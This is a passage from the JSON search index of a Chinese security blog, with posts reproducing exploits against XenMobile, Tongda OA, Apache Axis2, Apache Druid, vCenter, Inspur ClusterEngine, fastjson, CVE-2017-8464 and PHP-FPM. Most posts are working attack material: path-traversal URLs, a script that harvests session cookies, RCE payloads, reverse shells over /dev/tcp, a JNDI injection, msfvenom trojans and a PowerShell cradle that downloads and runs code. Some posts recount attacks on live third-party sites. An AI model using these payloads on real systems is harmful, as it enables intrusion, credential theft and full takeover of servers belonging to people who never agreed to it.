12http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;jsp&#x2F;help-sb-download.jsp?sbFileName&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdhttp:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;jsp&#x2F;help-sb-download.jsp?sbFileName&#x3D;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;sas&#x2F;sw&#x2F;config&#x2F;sftu.properties 批量检测如下：","path":"2021/03/15/CVE-2020-8209-XenMobile-控制台-任意文件读取/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"通达OA v11.7 在线任意用户登录","text":"# 通达 OA v11.7 在线任意用户登录 # 漏洞描述 需要有在线用户才能登录 # 资产查找 FOFA： 1app&#x3D;&quot;TDXK-通达OA&quot; # 漏洞复现 首先访问： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0 页面空白则表示用户在线，并且此时已经获取到了 cookie 返回显示 RELOGIN ，则不在线 若在线，则访问成功登录 uid 为 1 的用户，也就是管理员用户 exp 脚本如下（来源网络）： 1234567891011121314151617181920212223import requestsfrom bs4 import BeautifulSoupimport sysimport reurl = &quot;http://127.0.0.1/&quot;for i in range(1,600): try : vuln_url = url + &quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;+str(i)+&quot;&amp;P_VER=0&quot; resp = requests.get(vuln_url) soup = BeautifulSoup(resp.text,&#x27;html.parser&#x27;) if &#x27;RELOGIN&#x27; in soup.get_text(): print(i,&quot;不存在&quot;) else: PHPSESSION = re.findall(r&#x27;PHPSESSID=(.*?);&#x27;, str(resp.headers)) print(&#x27;uid = &#x27;+str(i)+&quot; 在线，COOKIE值是：PHPSESSID=&quot;+str(PHPSESSION[0])) print(url+&quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;+str(i)+&quot;&amp;P_VER=0&quot;) print(url+&quot;/general/&quot;) break except: print(&#x27;站点不存在漏洞!&#x27;) break 管理员用户 其他用户","path":"2021/03/15/通达OA-v11-7-在线任意用户登录/","date":"03-15","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"}]},{"title":"Apache Axis2 后台文件上传","text":"Apache Axis2 后台文件上传简介Axis是一个开源、基于XML的Web服务架构。最开始由IBM公司研发,叫IBM-SOAP。后来由Apache基金会在SOAP的基础上推出了AXIS。AXIS本质是一个Java语言编写的SOAP引擎。利用它我们可以在各种分布式应用中,让各个应用能够彼此操作、交互。 漏洞复现默认后台路径：/axis2-admin/login 默认账号密码：admin/axis2 工具下载地址： https://github.com/CaledoniaProject/AxisInvoker 访问后台地址，使用默认密码成功登录， 点击Upload Service上传aar包进行命令执行 上传工具中 build目录中的 aar 包，成功上传 命令执行windows 或 linux 均可正常执行 根据工具md文档操作如下 运行命令： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;exec?cmd&#x3D;whoami 写文件： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;write?path&#x3D;c:\\566.txt&amp;content&#x3D;123 读取文件： 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;read?path&#x3D;c:\\566.txt 下载文件并将其保存 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;download?url&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;file&#x3D;c:\\123.txt","path":"2021/03/15/Apache-Axis2-后台文件上传/","date":"03-15","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"CVE-2021-25646 Apache Druid远程代码执行","text":"# CVE-2021-25646 Apache Druid 远程代码执行 # 漏洞描述 Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。 # 影响版本 Apache Druid &lt; 0.20.1 # 资产查找 FOFA： 1title&#x3D;&quot;Apache Druid&quot; # 漏洞复现 访问目录 /druid/indexer/v1/sampler ，空白页面 bp 抓包，如下 注意修改 Content-Type # payload1，ping dnslog 1234567891011121314151617181920212223242526272829303132333435363738394041POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1Content-Type: application&#x2F;json;charset&#x3D;utf-8&#123; &quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123; &quot;type&quot;:&quot;index&quot;, &quot;ioConfig&quot;:&#123; &quot;type&quot;:&quot;index&quot;,&quot;inputSource&quot;:&#123; &quot;type&quot;:&quot;http&quot;, &quot;uris&quot;:[&quot;https:&#x2F;&#x2F;www.baidu.com&quot;] &#125;,&quot;inputFormat&quot;:&#123; &quot;type&quot;:&quot;tsv&quot;, &quot;findColumnsFromHeader&quot;:true &#125; &#125;,&quot;dataSchema&quot;:&#123; &quot;dataSource&quot;:&quot;sample&quot;, &quot;timestampSpec&quot;:&#123; &quot;column&quot;:&quot;timestamp&quot;, &quot;missingValue&quot;:&quot;2010-01-01T00:00:00Z&quot; &#125;,&quot;dimensionsSpec&quot;:&#123;&#125;, &quot;transformSpec&quot;:&#123; &quot;transforms&quot;:[], &quot;filter&quot;:&#123; &quot;type&quot;: &quot;javascript&quot;, &quot;function&quot;: &quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping 8bx520.dnslog.cn&#39;)&#125;&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;&quot;: &#123; &quot;enabled&quot;: &quot;true&quot; &#125; &#125; &#125; &#125;,&quot;type&quot;:&quot;index&quot;, &quot;tuningConfig&quot;:&#123; &quot;type&quot;:&quot;index&quot; &#125; &#125;,&quot;samplerConfig&quot;:&#123; &quot;numRows&quot;:50, &quot;timeoutMs&quot;:10000 &#125;&#125; 响应包 dnslog 反弹 shell，将 exec 内容改为 1&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;3344 0&gt;&amp;1 # payload2，回显 123456789101112131415161718192021222324252627&#123; &quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123; &quot;ioConfig&quot;: &#123; &quot;type&quot;: &quot;index&quot;, &quot;firehose&quot;: &#123; &quot;type&quot;: &quot;local&quot;, &quot;baseDir&quot;: &quot;&#x2F;etc&quot;, &quot;filter&quot;: &quot;passwd&quot; &#125; &#125;, &quot;dataSchema&quot;: &#123; &quot;dataSource&quot;: &quot;%%DATASOURCE%%&quot;, &quot;parser&quot;: &#123; &quot;parseSpec&quot;: &#123; &quot;format&quot;: &quot;javascript&quot;, &quot;timestampSpec&quot;: &#123;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;function&quot;: &quot;function()&#123;var s &#x3D; new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#39;id&#39;).getInputStream()).useDelimiter(\\&quot;\\\\A\\&quot;).next();return &#123;timestamp:\\&quot;2013-09-01T12:41:27Z\\&quot;,test: s&#125;&#125;&quot;, &quot;&quot;: &#123; &quot;enabled&quot;: &quot;true&quot; &#125; &#125; &#125; &#125; &#125;&#125; 回显 id # Finally 以上仅为验证漏洞，切勿其他操作，年轻人耗子为之，造成影响与作者无关。","path":"2021/03/15/CVE-2021-25646-Apache-Druid远程代码执行/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"VMware vCenter Server 任意文件读取","text":"VMware vCenter Server 任意文件读取漏洞描述VMware vCenter存在任意文件读取漏洞，远程攻击者通过访问开放在外部的vCenter 控制台，可以任意读取主机上的文件。(可读取 vCenter 配置文件获得管理帐号密码)进而控制 vCenter 平台及其管理的虚拟机集群。 影响版本 VMware vCenter Server 6.5.0 a至f版 资产查找 FOFA： 1title&#x3D;&quot;ID_VC_Welcome&quot; payload： 123456windows：https:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.propertieshttps:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;C:&#x2F;windows&#x2F;win.inilinux:https:&#x2F;&#x2F;ip&#x2F;eam&#x2F;vib?id&#x3D;&#x2F;etc&#x2F;passwd 2016以上测试失败 漏洞修复升级版本","path":"2021/03/14/VMware-vCenter-Server-任意文件读取/","date":"03-14","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞","text":"锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞2021年3月8日，锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞，攻击者可以通过审查网页源代码获取到用户账号和密码，导致管理员用户认证信息泄露。 FOFA语法： 1title&#x3D;&quot;RG-UAC登录页面&quot; &amp;&amp; body&#x3D;&quot;admin&quot; 打开到登录页面，右键查看源码，搜索admin md5解密 输入admin用户以及破解的密码，成功登录后台 修复方式：更新系统版本","path":"2021/03/14/锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞/","date":"03-14","excerpt":"","tags":[{"name":"信息泄露","slug":"信息泄露","permalink":"https://spaceman-911.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"}]},{"title":"弱密码中发现的授权绕过","text":"# 弱密码中发现的授权绕过 某次 edu 测试中发现的，fofa 随便找一个学院的后台，发现一个前端写的不怎样的后台，看着就很 lo，直接尝试弱密码登录，直接成功登录，里面是一些招生数据 甚至还有一些学生的详细信息，如家庭地址，直接好家伙，注入我并未测试 于是尝试是否存在未授权，另一个浏览器不登录直接访问某个文件，竟然直接没有验证 啊这？不验证？那登陆的意义是啥？于是我尝试访问默认页面 default.aspx，发现 500 错误，直接猜测只验证了 default.aspx 页面，其他页面没有验证 正常成功登录如下 于是尝试登陆的时候抓包看看，抓取成功登录时的 cookie，% e7% ae% a1% e7%90%86% e5%91%98 是 url 编码，解码是 管理员 嗯？仅仅是 set 而已？那岂不是无需登录，设置 cookie 即可登录？于是我尝试不登录，直接带这个 cookie 访问 default.aspx 页面 成功来到后台 感觉是蛮重要的系统的，怎么后端就这么。。。按照这样，那应该也会存在注入啥的，由于之前提交漏洞了，现在也无法访问了也就没得再测试。 # 总结 在登陆的时候也看看返回包，尝试修改或许有收获 对比成功登录与登录失败，或许发现其中的 cookie 的不合理","path":"2021/03/11/弱密码中发现的授权绕过/","date":"03-11","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"}]},{"title":"浪潮ClusterEngine4.0集群管理系统前台RCE","text":"# 浪潮 ClusterEngine4.0 集群管理系统前台 RCE 正当我又是在摸鱼的时候，空白（ crazygod ）发来了浪潮 ClusterEngine4.0 集群管理系统前台 RCE 的 payload，嗯？那我这不得直接去复现？说干就干，fofa 一波， payload： 123POST &#x2F;loginop&#x3D;login&amp;username&#x3D;1 2\\&#39;,\\&#39;1\\&#39;\\); &#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F&#123;反弹shellIP&#125;%2F80%200%3E%261&#96; 找了几个站点均抓包失败，想必是修复了，一抓包就服务器连接失败，我这脾气，直接下一个，终于到了一个可以抓包的了 首先需要 vps 开启监听 nc -lvp 3344 然后开始登陆抓包，构造 payload，go post 数据包如下： 123456789101112131415POST &#x2F;login HTTP&#x2F;1.1Host: ipUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko&#x2F;20100101 Firefox&#x2F;86.0Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8X-Requested-With: XMLHttpRequestContent-Length: 103Origin: https:&#x2F;&#x2F;ipConnection: closeReferer: https:&#x2F;&#x2F;ip&#x2F;module&#x2F;login&#x2F;login.htmlCookie: lang&#x3D;cnop&#x3D;login&amp;username&#x3D;1%202\\&#39;,\\&#39;1\\&#39;\\);&#96;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F***.**.**.***%2F3344%200%3E%261&#96; 发包成功获取 root 权限 至于原理咱也不是很懂，导致命令执行，源码啥的我也没去看过，只能等空白大佬带我们分析分析了","path":"2021/03/11/浪潮ClusterEngine4-0集群管理系统前台RCE/","date":"03-11","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"一次fastjson反序列化-实战","text":"# 一次 fastjson 反序列化 - 实战 爪哇一窍不通的我，某次找到一个高校的站点 随便登录抓包，发现是 json 请求 于是尝试使用 Bp 插件 Fastjsonscan 扫描 这不是 fastjson 反序列化漏洞吗，工具梭哈，首先生成编码后的反弹 shell 生成编码后的反弹 shell（编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html） 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vpsip&#x2F;3344 0&gt;&amp;1 使用 rce 工具（ https://github.com/wyzxxz/fastjson_rce_tool ），在 vps 上运行 rce 工具 1java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections5 &quot;编码后的bash&quot; 再开启一个终端 vps 监听 3344 端口，bp 改包发送数据 1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;vps:1099&#x2F;Object&quot;,&quot;autoCommit&quot;:true&#125; 成功反弹 shell # 总结 原理或许不知道，但是可以尝试工具梭哈，脚本小子就是我 多看大佬的文章，最新的漏洞，在实战时有很大的帮助","path":"2021/02/23/一次fastjson反序列化-实战/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"从一次文件下载到getshell","text":"# 从一次文件下载到 getshell 由于没有实战过任意文件下载，于是去 gogo 了一下，发现一个任意文件下的地址： http://www.xxx.cn/down.php?file=download/xxxx.pdf 随便输入一个文件看看 好家伙，bt 默认不开启这个，但是通过这个报错我们也知道路径了，于是就下载一个 index.php 通过这个文件，找到了其他的文件，重要的文件不就是数据库配置文件吗 下载这个配置，得到后台地址和数据库登录信息等 直接尝试连接（ip 直接 whois 查询），进入 admin 表，直接好家伙，密码还是明文 通过刚刚得到的后台地址，直接进行登录 产品配置发现一个上传点，直接选择添加，直接上传 php 文件，直接被过滤，说是非图片类型，难道是 mime 检测而已？直接尝试修改 Content-Type 头，成功上传 右键查看图片，getshell # 总结 有下载的地方尝试或许有惊喜 读读源码，前端漂亮的站点，有时候后台没做到位 摸鱼完了，又水了一篇，有时候不能想太多，但需要多多尝试，但要适而可止","path":"2021/02/23/从一次文件下载到getshell/","date":"02-23","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"}]},{"title":"MSF+FRP实现远程渗透","text":"# MSF-FRP 实现远程渗透 首先下载 frp 工具（https://github.com/fatedier/frp/releases），放至 vps 和 kali，我的 vps 是 centos7，所以我选择的是 frp_0.35.1_linux_386.tar.gz ，若不了解自己 vps 的体系结构可参考 linux 系统的体系结构：https://blog.csdn.net/lixuande19871015/article/details/90485929 frp 支持的 linux 的架构 ：https://blog.csdn.net/lixuande19871015/article/details/98613711 # 0x01 vps 服务端的配置 下载 frp 解压至 vps ，编辑 frps.ini 文件，编辑时请勿带注释 12345678[common]bind_addr &#x3D; 0.0.0.0bind_port &#x3D; 6531 #frp连接端口dashboard_addr &#x3D; 0.0.0.0dashboard_port &#x3D; 7500 #网页访问端口dashboard_user &#x3D; admin #用户名dashboard_pwd &#x3D; password #密码token &#x3D; spaceman #frp连接口令 完成配置，启动服务端 前台启动： ./frps -c frps.ini 后台启动： nohup ./frps -c frps.ini &gt; log.txt &amp; 可登录图形化界面 ip:7500，记得防火墙开启这几个端口 # 0x02 kali 客户端的配置 下载 frp 解压至 kali，编辑 frpc.ini 文件 123456789[common]server_addr &#x3D; 81.xx.xx.xx #vps的ipserver_port &#x3D; 6531 #连接frp的端口token &#x3D; spaceman #连接frp的口令[msf]type &#x3D; tcp #连接协议local_ip &#x3D; 127.0.0.1 #本地iplocal_port &#x3D; 6759 #本地转发vps端口remote_port &#x3D; 6000 #访问端口，也是木马的端口 启动 frpc， ./frps -c frps.ini vps 连接成功 kali 连接成功 木马制作 1msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;vps LPORT&#x3D;6000 -e x86&#x2F;shikata_ga_nai -b &#39;\\x00\\x0a\\xff&#39; -i 15 -f exe -o shell.exe msf 设置监听 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 127.0.0.1set lport 6759run 远程小伙伴运行木马测试，成功","path":"2021/02/15/MSF-FRP实现远程渗透/","date":"02-15","excerpt":"","tags":[{"name":"MSF","slug":"MSF","permalink":"https://spaceman-911.gitee.io/tags/MSF/"}]},{"title":"CVE-2017-8464远程命令执行漏洞复现","text":"# CVE-2017-8464 远程命令执行漏洞复现 # 漏洞描述 2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危 Windows 系统通过解析 .LNK 后缀文件时，是使用二进制来解析的，而当恶意的二进制代码被系统识别执行的时候就可以实现远程代码执行，由于是在 explorer.exe 进程中运行的，所以 load 进内存的时候与当前用户具有相同的权限。 于是攻击者利用这一解析过程的漏洞，将包含恶意二进制的代码被附带进可移动驱动器 (或远程共享过程中)，受害者使用 powershell 解析 .LNK 文件后就会被黑客所控制。 成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。 # 影响版本 123456789windows 7windows 8windows 8.1windows 10windows server 2008windows server 2008 R2windows server 2012windows server 2012 R2windows server 2016 # 环境准备 攻击机：kali IP：192.168.30.154 靶机：Windows 7 X64 IP：192.168.30.153 # 漏洞复现 使用 kali msfvenom 生成一个反弹 shell 1root@kali911:~# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.30.154 LPORT&#x3D;5656 -f psh-reflection&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;hack.ps1 这里生成至 /var/www/html 目录下 启动 Apache 服务 12root@kali911:~# service apache2 restart root@kali911:~# service apache2 status 浏览器打开该文件，查看是否成功 1http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.ps1 启动 msf 1root@kali911:~# msfconsole 使用监听模块 multi/handler 1msf5 &gt; use exploit&#x2F;multi&#x2F;handler 指定 kali 攻击机 IP 1msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.30.154 设置端口 1msf5 exploit(multi&#x2F;handler) &gt; set LPORT 5656 设置返回载荷 1msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 靶机创建快捷键（桌面右键 -&gt; 新建 -&gt; 快捷方式），输入以下内容 1powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.30.154&#x2F;hack.ps1&#39;);test.ps1&quot; 完成创建，运行快捷方式，一闪而过 回到 kali ，开始攻击 1msf5 exploit(multi&#x2F;handler) &gt; exploit 查看系统信息 1meterpreter &gt; sysinfo 对屏幕进行截图 1meterpreter &gt; screenshot 还可进行更多操作这里就不一一介绍了 登录 shell 1meterpreter &gt; shell 查看当前用户 1C:\\Windows\\System32\\WindowsPowerShell\\v1.0&gt;whoami","path":"2021/02/11/CVE-2017-8464远程命令执行漏洞复现/","date":"02-11","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"CVE-2019-11043漏洞复现","text":"# CVE-2019-11043 漏洞复现 # 0x01 漏洞简介 nginx + php-fpm 配置不当，当 nginx 配置文件中有 fastcgi_split_path_info ，却没有 if(!-f $document_root$fastcgi_script_name)&#123;return 404;&#125; 的时候就会导致远程代码执行。 向 Nginx + PHP-FPM 的服务器 URL 发送 %0a 时，服务器返回异常。 该漏洞需要在 nginx.conf 中进行特定配置才能触发。具体配置如下： 1234567location ~ [^&#x2F;]\\.php(&#x2F;|$) &#123;...fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$;fastcgi_param PATH_INFO $fastcgi_path_info;fastcgi_pass php:9000;...&#125; 攻击者可以使用换行符（％0a）来破坏 fastcgi_split_path_info 指令中的 Regexp。 Regexp 被损坏导致 PATH_INFO 为空，从而触发该漏洞。 影响版本： PHP 7.0 版本 PHP 7.1 版本 PHP 7.2 版本 PHP 7.3 版本 修复建议： PHP 7.1.X 更新至 7.1.33 PHP 7.2.X 更新至 7.2.24 PHP 7.3.X 更新至 7.3.11 # 0x02 环境搭建 系统：kali # 安装 docker、golang 环境 12sudo apt-get install docker docker-composesudo apt install golang # 搭建环境 12git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.gitcd vulhub&#x2F;php&#x2F;CVE-2019-11043 &amp;&amp; docker-compose up -d 查看 docker 环境： 访问 8080 端口，成功如下 # 0x03 漏洞利用 # 安装漏洞利用工具 1234git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.gitcd phuip-fpizdamgo env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cngo get -v &amp;&amp; go build 默认使用的是 proxy.golang.org，在国内无法访问，所以换了一个国内能访问的代理地址：https://goproxy.cn # 工具攻击 1.&#x2F;phuip-fpizdam http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php 成功利用，参数名为 a # 0x04 参考链接： https://blog.csdn.net/weixin_43606134/article/details/107646467 https://blog.csdn.net/qq_43342566/article/details/102733144 http://blog.leanote.com/post/snowming/9da184ef24bd https://blog.csdn.net/weixin_40412037/article/details/111225967","path":"2021/02/10/CVE-2019-11043漏洞复现/","date":"02-10","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]}],"categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"资源","slug":"资源","permalink":"https://spaceman-911.gitee.io/tags/%E8%B5%84%E6%BA%90/"},{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"提权","slug":"提权","permalink":"https://spaceman-911.gitee.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CNVD","slug":"CNVD","permalink":"https://spaceman-911.gitee.io/tags/CNVD/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"},{"name":"信息泄露","slug":"信息泄露","permalink":"https://spaceman-911.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"name":"MSF","slug":"MSF","permalink":"https://spaceman-911.gitee.io/tags/MSF/"}]}